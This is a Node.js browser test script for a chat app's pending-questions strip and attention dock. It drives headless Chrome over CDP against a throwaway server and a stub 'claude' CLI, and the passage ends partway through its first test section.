#!/usr/bin/env node
// THE NEEDS STRIP, THE ANNOUNCE AND THE HELD STACK, IN A REAL CHROME — the second half of test-chat-needs-card-chrome (B-419b
// split the 161-leg suite at ⑫|⑬ by meaning: the card half judges the card, the accordion and the holds; THIS half the stacked
// tail, the tail r2, the attention dock, the announce, the pick and the held stack). The SAME boot harness: a throwaway server
// in a git worktree (this tree's src/ + built public/, the fake channel adapters on), ONE stub `claude` conversation behind the
// real chat-wrapper whose turns RUN THE REAL CLIs, and headless Chrome over raw CDP; the round-five helpers and the desktop
// page's load are ONE shared module (scripts/chat-needs-kit.mjs). ⓪'s RED bundle lives in the card half: this half boots on
// this tree's own bundle and its first assert says so.
// Sections (moved whole from the card half, their legs and RED controls unchanged):
//   LANE NEEDS-CARD-TAIL (each RED on 90c995a3 — the owner on 2.369.360: «这个应该同时堆叠在页面最下吗？» + R5 «…直接跳转到对应的
//     上下文»): ⑬ six asks, then ~300 records of history (the window at the tail, their records far above it) ⇒ ONE docked card
//     (the newest, its dock line) at 1280 and 390×844, the chip «· 6 questions»; the chip's click LISTS the six (newest first,
//     the age kept) and choosing the oldest loads the window up to it and opens its card in its tool card; the docked ask
//     answered elsewhere ⇒ the dock and the chip move in the same frame; the tray row's door lands on the record that filed
//     it; an ask with no record docks at the end saying why; a reader who scrolled is never moved by a broadcast, a press lands.
//     ROUND 2 (each RED on 9de5c902): ⑭ three asks over ~900 records — 4 wheels up (an older page loaded) the dock stays under
//     the LAST displayed record, and is there back at the bottom; the chip's walk (the oldest, then one filed BELOW that window)
//     lands at its record; a slow landing (2.5 s pages) never overrules the newer press; the DOCKED ask answered on another
//     client moves a scrolled reader 0 px; the door of an answered ask whose record is folded opens the run and lands on it.
//   LANE NEEDS-CARD-TAIL r10 (each RED on bd5c5fd98 — the owner 2026-10-30: «…不要停靠在聊天内容本身里了，而是体现出"这是专门停靠
//     等我操作的事情，不会随着 chatview 浮动"的一个 UI»): THE ATTENTION DOCK replaces the docked card AND the bar's chip — ⑬/⑭: no
//     card at the end, the strip «· N» shows the newest, a tap on its question lands it, an ask with no record lands at the
//     live end and is SAID; ⑰ the strip's stress shapes (1 / 3 / 30 items, a 400-char question, six options, an answer on
//     the phone, a 320 px window, a 6-line composer, a filing 5000 px up, the strip never moving with a scroll) + its shots;
//     ⑱ THE ANNOUNCE (the owner's addendum, 11:5x: «有权限申请的时候窗口应该触发闪烁和 inbox 附近的弹窗»): a new ask flashes its window
//     and stands as a card at the For-you button — ten in a minute, one expiring while up, two windows at once, seen, one press
//     opens it, the phone.
//   SHOTS (desktop 1280 + phone 390 / 375): ⑬'s tail + door landings, ⑭'s r2 shapes, ⑰'s dock stress shapes, ⑱–㉒'s announce,
//     reach, yield, run and held-stack shapes (the end-of-suite check lists them).
// Requires google-chrome (SKIP without) and a fresh `npm run build`. Run: node scripts/test-chat-needs-strip-chrome.mjs [--shots <dir>]
import { execSync, spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { freePorts, scratch, scratchHome, ONBOARDED_SOURCE, vncEnv, endRootedProcesses } from './scratch.mjs';
import { armWatchdog } from './suite-watchdog.mjs';
import { chatNeedsKit, loadDesk } from './chat-needs-kit.mjs';
const VNC_ENV = await vncEnv(); // per-run singleton-Desktop display + port (test-architecture §57)
const require = createRequire(import.meta.url);
const repo = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
const CHROME = ['/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium'].find((p) => fs.existsSync(p));
if (!CHROME) { console.log('SKIP: no chrome/chromium'); process.exit(0); }
if (!fs.existsSync(path.join(repo, 'public', 'bundle.js'))) { console.log('✗ no public/bundle.js — run `npm run build` first'); process.exit(1); }

const [PORT, CDP_PORT] = await freePorts(2);
const wt = scratch('chat-needs-wt');
const fakeHome = scratchHome('chat-needs-home', fs);
const chromeDir = scratch('chat-needs-chrome');
const stubDir = scratch('chat-needs-stub');
const WORK = path.join(stubDir, 'work', 'ops');
const SHOTS = process.argv.includes('--shots') ? path.resolve(process.argv[process.argv.indexOf('--shots') + 1])  : process.env.VS_UI_SHOTS_DIR ? path.join(process.env.VS_UI_SHOTS_DIR, 'test-chat-needs-strip-chrome') : scratch('chat-strip-shots'); // CI uploads VS_UI_SHOTS_DIR on a failure — each half under its own name
for (const d of [stubDir, WORK, SHOTS]) fs.mkdirSync(d, { recursive: true });
const ORIGIN = `http://127.0.0.1:${PORT}`;
let pass = 0, fail = 0, skipped = 0;
const check = (n, c, e) => { if (c) { pass++; console.log(`  ✓ ${n}`); } else { fail++; console.log(`  ✗ ${n}${e !== undefined ? '\n    ' + (typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : ''}`); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const CONV = 'fake-poll/fake-poll-ops';

// ── the stub CLI: each user line = ONE turn; a line naming a verb RUNS the real CLI as a Bash tool call (tool_use → the CLI
//    through the hub → tool_result = its output), then one sentence; the CLIs are this tree's data/bin, run by node ──
fs.writeFileSync(path.join(stubDir, 'claude'), `#!${process.execPath}
const args = process.argv.slice(2);
if (args.includes('--version')) { console.log('2.1.308 (Claude Code) stub'); process.exit(0); }
const { spawnSync } = require('child_process');
const SID = 'cn-' + process.pid;
const BIN = ${JSON.stringify(path.join(wt, 'data', 'bin'))};
const out = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
out({ type: 'system', subtype: 'init', session_id: SID, model: 'claude-fable-5-1', cwd: process.cwd(), tools: ['Bash'], permissionMode: 'default', claude_code_version: '2.1.308' });
const VERBS = {
  ask: ['vibespace-ask', ['Which do we ship first?', '--detail', 'A: the payments fix — small, tested. B: the reports page — larger. I recommend A.', '--options', 'A — payments fix|B — reports page']],
  request: ['vibespace-channels', ['request', ${JSON.stringify(CONV)}, 'I watch the ops room for outages while you are away']],
  watch: ['vibespace-channels', ['watch', ${JSON.stringify(CONV)}, '--mode', 'wake', '--why', 'wake me on outages so I can open an incident']],
  tall: ['vibespace-ask', ['Before I merge the reports page tonight, which of the five rollout plans do we take, given that the payments fix already went out this morning, the team is away until Monday, the on-call rota has one person on it, and the last staged rollout took four hours to finish?', '--detail', 'Each plan is written up in the release notes. I recommend B.', '--options', 'Plan A — ship it all|Plan B — staged|Plan C — behind a flag|Plan D — wait a day|Plan E — ask the team']],
  // lane needs-card-tail r10 (⑰): a 400-character question, and one with six options
  big: ['vibespace-ask', ["Before we cut the release tonight, which of the rollout plans do we take for the reports page, given that the payments fix went out this morning, the team is away until Monday, the on-call rota has one person on it, the last staged rollout took four hours to finish, two customers asked for the export button by Friday, the database migration is still running on the replica, and the notes for support are not written yet?", '--detail', 'Plan A ships tonight; plan B waits for Monday. I recommend B.', '--options', 'A — tonight|B — Monday']],
  six: ['vibespace-ask', ['Which region do we open next?', '--detail', 'Six regions are ready; one at a time.', '--options', 'Frankfurt|Tokyo|São Paulo|Sydney|Toronto|Mumbai']],
};
let n = 0, buf = '', chain = Promise.resolve();
const turn = (line) => {
  const k = ++n;
  // lane needs-card-tail: «do:fill150» = 150 steps in this one turn, each a line of text + a tiny tool call (a text record and
  // a tool card — consecutive text alone merges into one record): the history that puts what came before far above the
  // window a chat loads at its tail (the window walks back to 24 text cards)
  const fill = /do:fill(\\d+)(t?)/.exec(line); // (lane needs-card-tail r10: «t» = a tall line — ⑰'s reader 5000 px up)
  if (fill) {
    for (let j = 0; j < Number(fill[1]); j++) {
      out({ type: 'assistant', session_id: SID, uuid: 'a-f' + k + '-' + j, message: { id: 'mf' + k + '_' + j, type: 'message', role: 'assistant', model: 'claude-fable-5-1', content: [{ type: 'text', text: fill[2] ? ('Filler line ' + j + ' of a long history, written long enough to wrap. ').repeat(14) : 'Filler line ' + j + ' of a long history.' }] } });
      out({ type: 'assistant', session_id: SID, uuid: 'a-ft' + k + '-' + j, message: { id: 'mft' + k + '_' + j, type: 'message', role: 'assistant', model: 'claude-fable-5-1', content: [{ type: 'tool_use', id: 'toolu_f' + k + '_' + j, name: 'Bash', input: { command: 'echo ' + j } }] } });
      out({ type: 'user', session_id: SID, uuid: 'u-ft' + k + '-' + j, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_f' + k + '_' + j, content: String(j), is_error: false }] } });
    }
    out({ type: 'result', subtype: 'success', is_error: false, duration_ms: 200, num_turns: 1, result: 'done', session_id: SID, total_cost_usd: 0.001, usage: { input_tokens: 10, output_tokens: 12 } });
    return;
  }
  const verb = Object.keys(VERBS).find((v) => line.includes('do:' + v));
  // the stress shape (acceptance round 2): «do:q3 do:q4 …» = one ask per number, each its own Bash call in this ONE turn
  // (lane needs-card-tail: «do:h73» = a stress question whose tool output keeps the item's id to itself — no record NAMES it)
  const calls = verb ? [[verb, ...VERBS[verb]]] : [...line.matchAll(/do:([qlhu])(\\d+)/g)].map((m) => [m[1] + m[2], 'vibespace-ask', [(m[1] === 'l' ? 'Longer question ' + m[2] + ': ship change ' + m[2] + ' today, once the reports page and the payments fix are both merged and the notes are written?' : 'Stress question ' + m[2] + ': ship change ' + m[2] + ' today?'), '--detail', 'Change ' + m[2] + ' is ready and tested. I recommend yes.', '--options', 'yes|no', ...(m[1] === 'u' ? ['--urgency', 'urgent'] : [])]]); // (r11: «do:u» = urgent — band 1, the announce's)
  // lane needs-card-tail r10 (⑰'s thirty): «do:par» files the turn's asks SIX at a time (one Bash card each, the same
  // records — the results land when their batch has run); a serial turn of 29 real CLI calls took ~90 s of the suite's clock
  if (/do:par/.test(line)) {
    const { spawn } = require('child_process');
    const one = ([vb, cli, argv], j) => new Promise((res) => {
      const tid = 'toolu_cn' + k + '_' + j;
      const command = cli + ' ' + argv.map((a) => (/^[\\w./:-]+$/.test(a) ? a : JSON.stringify(a))).join(' ');
      out({ type: 'assistant', session_id: SID, uuid: 'a-t' + k + '-' + j, message: { id: 'mt' + k + '_' + j, type: 'message', role: 'assistant', model: 'claude-fable-5-1', content: [{ type: 'tool_use', id: tid, name: 'Bash', input: { command, description: 'file it for the user' } }] } });
      const ch = spawn(process.execPath, [BIN + '/' + cli, ...argv], { env: process.env }); let text = '';
      ch.stdout.on('data', (d) => { text += d; }); ch.stderr.on('data', (d) => { text += d; });
      ch.on('close', (code) => { require('fs').appendFileSync(${JSON.stringify(path.join(stubDir, 'cli.log'))}, '### ' + vb + ' rc=' + code + '\\n' + text + '\\n'); out({ type: 'user', session_id: SID, uuid: 'u-t' + k + '-' + j, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: tid, content: text || '(no output)', is_error: code !== 0 }] } }); res(); });
    });
    return (async () => {
      for (let b = 0; b < calls.length; b += 6) await Promise.all(calls.slice(b, b + 6).map((c, i) => one(c, b + i)));
      out({ type: 'assistant', session_id: SID, uuid: 'a-' + k, message: { id: 'm' + k, type: 'message', role: 'assistant', model: 'claude-fable-5-1', content: [{ type: 'text', text: 'Filed them for you — they wait on your answer.' }] } });
      out({ type: 'result', subtype: 'success', is_error: false, duration_ms: 200, num_turns: 1, result: 'done', session_id: SID, total_cost_usd: 0.001, usage: { input_tokens: 10, output_tokens: 12 } });
    })();
  }
  calls.forEach(([vb, cli, argv], j) => {
    const tid = 'toolu_cn' + k + '_' + j;
    const command = cli + ' ' + argv.map((a) => (/^[\\w./:-]+$/.test(a) ? a : JSON.stringify(a))).join(' ');
    out({ type: 'assistant', session_id: SID, uuid: 'a-t' + k + '-' + j, message: { id: 'mt' + k + '_' + j, type: 'message', role: 'assistant', model: 'claude-fable-5-1', content: [{ type: 'tool_use', id: tid, name: 'Bash', input: { command, description: 'file it for the user' } }] } });
    const r = spawnSync(process.execPath, [BIN + '/' + cli, ...argv], { env: process.env, encoding: 'utf8', timeout: 60000 });
    const text = String(r.stdout || '') + (r.stderr ? String(r.stderr) : '');
    require('fs').appendFileSync(${JSON.stringify(path.join(stubDir, 'cli.log'))}, '### ' + vb + ' rc=' + r.status + '\\n' + text + '\\n');
    out({ type: 'user', session_id: SID, uuid: 'u-t' + k + '-' + j, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: tid, content: vb[0] === 'h' ? 'filed.' : text || '(no output)', is_error: r.status !== 0 }] } });
  });
  out({ type: 'assistant', session_id: SID, uuid: 'a-' + k, message: { id: 'm' + k, type: 'message', role: 'assistant', model: 'claude-fable-5-1', content: [{ type: 'text', text: calls.length ? 'Filed it for you — it waits on your answer.' : 'ok' }] } });
  out({ type: 'result', subtype: 'success', is_error: false, duration_ms: 200, num_turns: 1, result: 'done', session_id: SID, total_cost_usd: 0.001, usage: { input_tokens: 10, output_tokens: 12 } });
};
process.stdin.on('data', (d) => { buf += d; let i; while ((i = buf.indexOf('\\n')) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 1); let m = null; try { m = JSON.parse(line); } catch {} if (!m || m.type !== 'user') continue; const c = m.message && m.message.content; const txt = typeof c === 'string' ? c : Array.isArray(c) ? c.map((x) => x && x.text || '').join(' ') : ''; chain = chain.then(() => new Promise((res) => setTimeout(() => { Promise.resolve(turn(txt)).then(res, res); }, 120))); } });
process.stdin.on('end', () => setTimeout(() => process.exit(0), 300));
`, { mode: 0o755 });

// B-419b: the RED-control bundles (⓪'s base chat, ②b's press arm, ⑥'s open slot, ⑥c's moved-verb guard, ⑩b's pressed row) and the
// helpers only ⓪–⑫ use (say, findOpen, openChat, CHIP, scrollThenPress, skip) live in the card half — this half never reads them.

// ── throwaway server in a worktree (the tree's src/ + built public/ + data/bin — the CLIs the stub runs) ──
try { execSync(`git worktree remove --force ${wt}`, { cwd: repo, stdio: 'ignore' }); } catch { }
execSync(`git worktree add --detach ${wt} HEAD`, { cwd: repo, stdio: 'ignore' });
for (const f of ['src', 'public', 'server.js', 'package.json', 'data/bin']) execSync(`rm -rf ${wt}/${f} && cp -r ${repo}/${f} ${wt}/${f}`);
fs.symlinkSync(path.join(repo, 'node_modules'), path.join(wt, 'node_modules'));
fs.mkdirSync(path.join(wt, 'data'), { recursive: true });
const srvLog = fs.openSync(path.join(SHOTS, 'server.log'), 'a');
const srv = spawn(process.execPath, ['server.js'], { cwd: wt, env: { ...process.env, ...VNC_ENV, PORT: String(PORT), HOME: fakeHome, CLAUDE_CMD: path.join(stubDir, 'claude'), VIBESPACE_SKIP_AGENT_HOOKS: '1', VIBESPACE_PASSWORD: '', VIBESPACE_CHANNELS_FAKE: '1', NO_AUTO_OPEN: '1' }, stdio: ['ignore', srvLog, srvLog] });
const chrome = spawn(CHROME, ['--headless=new', `--remote-debugging-port=${CDP_PORT}`, '--no-first-run', '--disable-gpu', '--password-store=basic',
  '--no-sandbox', '--disable-dev-shm-usage', '--hide-scrollbars', '--disable-background-timer-throttling', `--user-data-dir=${chromeDir}`, 'about:blank'], { stdio: 'ignore' });
const cleanup = () => {
  try { chrome.kill('SIGKILL'); } catch { }
  try { srv.kill('SIGKILL'); } catch { }
  for (const root of [wt, fakeHome, stubDir, chromeDir]) { try { endRootedProcesses(root); } catch { } } // the server, dtach, the wrapper, the stub, Chrome (§57b)
  try { execSync(`git worktree remove --force ${wt}`, { cwd: repo, stdio: 'ignore' }); } catch { }
  for (const d of [chromeDir, fakeHome, stubDir, MUT, MUT2, MUT3, MUT4, MUT5]) { try { fs.rmSync(d, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }); } catch { } }
};
process.on('exit', cleanup);
for (const sig of ['SIGINT', 'SIGTERM']) process.on(sig, () => { cleanup(); process.exit(1); });
const PENDS = new Map();
// run bare (no gate) the suite assumes its ci.mjs row's budget (budgetFor: a chrome heavy row, 900 s) and says so — lane
// needs-card-tail r5: a run by hand took the 300 s default, and its own clock fired at 270 s, 23 s into ⑬, on a suite that
// runs ~430 s alone (int361's direct run of 497beb03; the gate's runs were green)
const BARE = !process.env.VIBESPACE_SUITE_BUDGET_MS;
// B-419b (int361, .386): this half (⑬–㉒) measured 420.6 s ALONE on the box under the lock; its own ceiling = 1.5 × that × 1.21
// (the runner's factor, 757–803 s vs 663 s for the whole suite at 8b3fdb6ab), up to 30 s = 780 s, inside its row's 840 s budget less the
// watchdog's 30 s (the whole suite's 840 s / 900 s before the split; lane needs-card-tail r10 had lifted it 600 → 840 s)
const WD = armWatchdog({ capMs: 780e3, env: BARE ? { ...process.env, VIBESPACE_SUITE_BUDGET_MS: '840000' } : process.env, exit: (code) => process.exit(code), pending: () => [...PENDS.values()].map((x) => `CDP ${x.method} (${((Date.now() - x.at) / 1000).toFixed(1)} s)`) });
console.log(`watchdog: ${Math.round(WD.deadline.ms / 1000)} s (${WD.deadline.capped ? "the suite's own ceiling" : 'the budget − 30 s'}; the budget ${Math.round(WD.deadline.budgetMs / 1000)} s — ${BARE ? "a bare run: its ci.mjs row's" : "the gate's"})`);
for (let i = 0; i < 120; i++) { try { await fetch(`${ORIGIN}/api/home`); break; } catch { await sleep(250); } }

// ── raw CDP, one connection per page (+ the RED control's bundle through the Fetch domain) ──
const WebSocket = require('ws');
const FA = require(path.join(repo, 'src/foryou-actions.js')); // r11: newestFirst — the stack's and the dock's ONE order
let seq = 0; let mutant = null;
const pageErrors = [];
async function connect(target) {
  const sock = new WebSocket(target.webSocketDebuggerUrl, { maxPayload: 64 * 1024 * 1024 });
  await new Promise((r) => sock.on('open', r));
  const pend = new Map();
  sock.on('message', (d) => {
    const m = JSON.parse(d);
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); PENDS.delete(m.id); return; }
    if (m.method === 'Runtime.exceptionThrown') pageErrors.push(m.params.exceptionDetails?.exception?.description || m.params.exceptionDetails?.text || 'unknown');
    if (m.method === 'Fetch.requestPaused') {
      const p = m.params, u = new URL(p.request.url);
      if (mutant?.bundle && u.pathname === '/bundle.js') sock.send(JSON.stringify({ id: ++seq, method: 'Fetch.fulfillRequest', params: { requestId: p.requestId, responseCode: 200, responseHeaders: [{ name: 'Content-Type', value: 'application/javascript' }, { name: 'Cache-Control', value: 'no-store' }], body: mutant.bundle.toString('base64') } }));
      else sock.send(JSON.stringify({ id: ++seq, method: 'Fetch.continueRequest', params: { requestId: p.requestId } }));
    }
  });
  const cdp = (method, params = {}) => new Promise((res, rej) => {
    const id = ++seq; PENDS.set(id, { method, at: Date.now() }); pend.set(id, (m) => (m.error ? rej(new Error(method + ': ' + m.error.message)) : res(m.result)));
    sock.send(JSON.stringify({ id, method, params }));
  });
  const evalJs = async (expr) => {
    const r = await cdp('Runtime.evaluate', { expression: expr, awaitPromise: true, returnByValue: true });
    if (r.exceptionDetails) throw new Error('page threw: ' + (r.exceptionDetails.exception?.description || r.exceptionDetails.text));
    return r.result.value;
  };
  const waitFor = async (expr, ms = 15000) => { const t0 = Date.now(); while (Date.now() - t0 < ms) { try { if (await evalJs(expr)) return true; } catch { } await sleep(120); } try { return await evalJs(expr); } catch { return false; } };
  await cdp('Runtime.enable'); await cdp('Page.enable');
  await cdp('Fetch.enable', { patterns: [{ urlPattern: '*bundle.js*', requestStage: 'Request' }] });
  await cdp('Page.addScriptToEvaluateOnNewDocument', { source: ONBOARDED_SOURCE }); // §47: a returning user — no first-run wizard
  // every card's FIRST sighting, stamped on the page's clock (= the hub's: one machine) — the «within 1 s» judge
  await cdp('Page.addScriptToEvaluateOnNewDocument', { source: `window.__cnSeen = {}; new MutationObserver(() => { for (const c of document.querySelectorAll('.cn-card[data-item]')) if (!window.__cnSeen[c.dataset.item]) window.__cnSeen[c.dataset.item] = Date.now(); }).observe(document, { childList: true, subtree: true });` });
  const device = async (w, h, { mouse = false } = {}) => {
    await cdp('Emulation.setDeviceMetricsOverride', { width: w, height: h, deviceScaleFactor: mouse ? 1 : 2, mobile: !mouse });
    await cdp('Emulation.setTouchEmulationEnabled', { enabled: !mouse, maxTouchPoints: mouse ? 1 : 5 });
    await cdp('Emulation.setEmulatedMedia', { features: [{ name: 'hover', value: mouse ? 'hover' : 'none' }, { name: 'pointer', value: mouse ? 'fine' : 'coarse' }] });
  };
  const load = async () => {
    await cdp('Page.navigate', { url: ORIGIN + '/' });
    await waitFor('!!(window.app && app.ready)', 30000); await evalJs('app.ready.then(() => true)');
    await waitFor(`!document.getElementById('loading-screen')`, 15000); await sleep(900);
  };
  const tapAt = async (x, y) => {
    await cdp('Input.dispatchTouchEvent', { type: 'touchStart', touchPoints: [{ x, y }] }); await sleep(60);
    await cdp('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] }); await sleep(350);
  };
  const clickAt = async (x, y) => {
    await cdp('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y }); await sleep(30);
    await cdp('Input.dispatchMouseEvent', { type: 'mousePressed', x, y, button: 'left', clickCount: 1 }); await sleep(40);
    await cdp('Input.dispatchMouseEvent', { type: 'mouseReleased', x, y, button: 'left', clickCount: 1 }); await sleep(350);
  };
  const centre = (sel) => evalJs(`(() => { const e = document.querySelector(${JSON.stringify(sel)}); if (!e) return null; e.scrollIntoView?.({ block: 'nearest' }); const b = e.getBoundingClientRect(); return b.width && b.height ? { x: b.left + b.width / 2, y: b.top + b.height / 2 } : null; })()`);
  const press = async (sel, { touch = true } = {}) => { const p = await centre(sel); if (!p) throw new Error('press: nothing at ' + sel); await (touch ? tapAt(p.x, p.y) : clickAt(p.x, p.y)); };
  const shot = async (name) => { try { const r = await cdp('Page.captureScreenshot', { format: 'png' }); fs.writeFileSync(path.join(SHOTS, name), Buffer.from(r.data, 'base64')); } catch { } };
  return { cdp, evalJs, waitFor, device, load, tapAt, clickAt, press, shot, front: () => cdp('Page.bringToFront'), close: () => { try { sock.close(); } catch { } } };
}

const targets = async () => (await (await fetch(`http://127.0.0.1:${CDP_PORT}/json`)).json()).filter((x) => x.type === 'page');
let target = null;
for (let i = 0; i < 120 && !target; i++) { try { target = (await targets())[0]; } catch { } if (!target) await sleep(250); }
if (!target) { console.log('✗ chrome never exposed a CDP page target'); process.exit(1); }
const A = await connect(target);

// ── the conversation (a stub claude behind the real chat-wrapper) and its turns ──
const hubWs = new WebSocket(`ws://127.0.0.1:${PORT}/ws`); const frames = [];
await new Promise((r) => hubWs.on('open', r)); hubWs.on('message', (d) => { try { frames.push(JSON.parse(String(d))); } catch { } });
hubWs.send(JSON.stringify({ type: 'create', backend: 'claude', mode: 'chat', cwd: WORK, reqId: 'cn-ops' }));
let SID = null; for (let i = 0; i < 100 && !SID; i++) { const f = frames.find((m) => m?.type === 'created' && m.reqId === 'cn-ops'); if (f) SID = f.sessionId; else await sleep(150); }
const api = async () => (await (await fetch(`${ORIGIN}/api/user-todos`)).json()).todos;
const cliLog = () => { try { return fs.readFileSync(path.join(stubDir, 'cli.log'), 'utf8'); } catch { return ''; } };
/** the CLI's output lands in the log when the CLI EXITS — a moment after its item is on the hub */
const logHas = async (re, ms = 15000) => { const t0 = Date.now(); while (Date.now() - t0 < ms) { if (re.test(cliLog())) return true; await sleep(120); } return re.test(cliLog()); };
const CHAT = (sid) => `[...app.wm.windows.values()].find((w) => w.type === 'chat' && app.sessions.get(w.id)?.sessionId === ${JSON.stringify(sid)})`;
/** The card of item `id` in page P: where it sits (the record's command), its kind, its verbs, its words, its rect. */
const CARD = (id) => `(() => { const c = document.querySelector('.cn-card[data-item="${id}"]'); if (!c) return null; const host = c.closest('.chat-msg'); const raw = host && host._rawMsg; const b = c.getBoundingClientRect(); const lr = c.closest('.chat-message-list')?.getBoundingClientRect();
  return { open: c.classList.contains('cn-open'), done: c.classList.contains('cn-done'), kind: c.dataset.kind, hostRole: raw && raw.role, hostCmd: raw && raw.content && raw.content[0] && raw.content[0].input ? String(raw.content[0].input.command || '') : '', head: c.querySelector('.cn-head')?.textContent || '', text: c.querySelector('.ut-text')?.textContent || '', verb: c.querySelector('.cn-line-verb')?.textContent || '', line: c.querySelector('.cn-line')?.textContent || '',
    verbs: [...c.querySelectorAll('button')].filter((x) => x.offsetParent).map((x) => (x.getAttribute('data-label') || x.textContent || '').trim()), chips: [...c.querySelectorAll('.ut-opt')].map((x) => (x.getAttribute('aria-label') || x.textContent)), approve: !!c.querySelector('.ut-action-proposal[data-answer="approve"]'),
    rect: { top: Math.round(b.top), bottom: Math.round(b.bottom), h: Math.round(b.height) }, list: lr ? { top: Math.round(lr.top), bottom: Math.round(lr.bottom) } : null, flash: c.classList.contains('chat-ask-flash'), el: !!c }; })()`;
/** the conversation's ChatView in the page (its needs cards, its list) */
const VIEW = `(() => { for (const v of app.sessions?.values?.() || []) if (v && v._needsCards && v._messageList?.isConnected) return v; return null; })()`;
// lane phone-dock-restore: the phone's strip is ONE row until tapped — a phone leg that reads the item's answers opens it first
// (a tap on its «View»), then waits the press arm (what the open moved under the finger answers nothing for ARM_MS)
const OPENSTRIP = `(() => { const d = [...document.querySelectorAll('.chat-attn-dock:not([hidden])')].find((x) => x.getClientRects().length), b = d && d.querySelector(':scope > .cad-look'); if (!b || !b.getClientRects().length) return null; const r = b.getBoundingClientRect(); return { x: r.left + r.width / 2, y: r.top + r.height / 2 }; })()`;
const openStrip = async (P) => { const at = await P.evalJs(OPENSTRIP); if (at) { await P.tapAt(at.x, at.y); await sleep(800); } return !!at; };
const T0 = Date.now();
const lap = (what) => console.log(`  (${what} at ${((Date.now() - T0) / 1000).toFixed(1)} s)`);

try {
  const { J, newConv, sayTo, byText, openOnly, toConv } = chatNeedsKit({ hubWs, WORK, api, sleep, CHAT }); // scripts/chat-needs-kit.mjs (shared with the card half)
  await loadDesk(A);
  // B-419b: ⓪ (the RED bundle without the needs cards) lives in the card half and leaves ITS page on that bundle until the next
  // load — this half never runs ⓪ and boots clean: its first assert names the bundle the page was served
  { const real = fs.statSync(path.join(repo, 'public', 'bundle.js')).size; const got = await A.evalJs(`fetch('/bundle.js').then((r) => r.text()).then((t) => new TextEncoder().encode(t).length)`);
    check(`the strip half boots on THIS tree's own bundle (public/bundle.js, ${real} bytes) — never ⓪'s RED one`, mutant === null && got === real, { mutant: !!mutant, got, real }); }
  lap('boot done');


  // ── lane needs-card-tail: THE TAIL + THE ONE LANDING — one conversation whose six asks stand ~300 records above the window ──
  console.log('⑬ THE STACKED TAIL + THE ONE LANDING (lane needs-card-tail — the owner on 2.369.360: «这个应该同时堆叠在页面最下吗？»; R5: «inbox点消息跳转会对话的时候…直接跳转到对应的上下文»)');
  try {
    // only this conversation's asks wait from here on (the earlier legs' items done) — the tray's bands show each of them
    for (const it of (await api()).open) await A.evalJs(`fetch('/api/user-todos/' + encodeURIComponent(${J(it.id)}), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'done' }) }).then((r) => r.status)`);
    const sid = await newConv('tail'); await sleep(600);
    sayTo(sid, 'six asks do:q71 do:q72 do:h73 do:q74 do:l75 do:l76'); // the third's tool output names no id (R5 (b)'s record-less ask); the last two long (R4's cut)
    const six = await byText(/^(Stress|Longer) question 7[1-6]:/, 6);
    const ids = six.map((i) => i.id); // oldest first
    await sleep(2600); // the history that follows is stamped past the filings (placementOf's SKEW_MS)
    sayTo(sid, 'a long history do:fill150');
    const bsid = six[0] ? six[0].sessionKey.slice(six[0].sessionKey.indexOf(':') + 1) : '';
    const page = async (offset, limit) => { try { return await (await fetch(`${ORIGIN}/api/session-messages?backend=claude&backendSessionId=${encodeURIComponent(bsid)}&cwd=${encodeURIComponent(WORK)}&offset=${offset}&limit=${limit}`)).json(); } catch { return {}; } };
    let total = 0;
    for (let i = 0; i < 150 && total < 300; i++) { total = (await page(0, 1)).total || 0; if (total < 300) await sleep(200); }
    const TAILQ = `(() => { const v = ${VIEW}; if (!v) return null; const l = v._messageList, cards = [...l.querySelectorAll(':scope > * > .cn-cards > .cn-card.cn-open')], last = [...l.querySelectorAll(':scope > .chat-msg')].pop(), chip = [...document.querySelectorAll('.chat-attn-dock:not([hidden]) :is(.cad-count, .cad-num)')].find((c) => c.offsetParent), d = v._attnDock, srow = d && !d.hidden ? d.querySelector('.cad-rows > .ut-item') : null;
      return { strip: srow ? srow.dataset.id : null, ws: v._windowStart, we: v._windowEnd, total: v._total, n: cards.length, ids: cards.map((c) => c.dataset.item), atLast: cards.filter((c) => c.closest('.chat-msg') === last).length, docked: cards.filter((c) => c.classList.contains('cn-docked')).map((c) => c.dataset.item), dock: d ? d.textContent : '', dockShown: !!d && d.getClientRects().length > 0, chip: chip && chip.offsetParent ? chip.textContent.trim() : '', open: cards.filter((c) => !c.classList.contains('cn-fold')).map((c) => c.dataset.item) }; })()`;
    const atTail = (P, n) => P.waitFor(`(() => { const v = ${VIEW}, c = document.querySelector('.chat-attn-dock:not([hidden]) .cad-count'); return !!v && v._total >= ${total} && v._windowEnd >= v._total && !!c && new RegExp('· ${n} ').test(c.textContent + ' '); })()`, 15000);
    // R1 at 1280 — THE OWNER'S SHAPE: the window at the tail, six asks whose records are far above it
    await toConv(A, sid, [], 1280, 800, false); await atTail(A, 6); await sleep(1200);
    const t0 = await A.evalJs(TAILQ);
    await A.shot('desktop-1280-tail.png');
    check(`setup: six asks, then ${total - 11} records of history — the window loaded at the tail (records ${t0 && t0.ws}–${t0 && t0.we} of ${t0 && t0.total}), the asks' records far above it`, ids.length === 6 && total >= 300 && !!t0 && t0.ws > 200 && t0.we === t0.total, { ids: ids.length, total, t0 });
    check(`r10 R1 (RED on 90c995a3: six cards stacked at the end; on bd5c5fd98: ONE docked card, «停靠在末尾 — 它是在对话更上面提出的 · 共 6 个在等你») the end holds NO card (${t0 && t0.n} open in the window, ${t0 && t0.atLast} under the last record); the strip «${t0 && t0.chip}» shows the NEWEST`, !!t0 && t0.n === 0 && t0.atLast === 0 && t0.strip === ids[5] && /· 6 questions/.test(t0.chip), t0);
    // R1 at 390×844 (the phone): the same
    await toConv(A, sid, [], 390, 844, true); await atTail(A, 6); await sleep(1200);
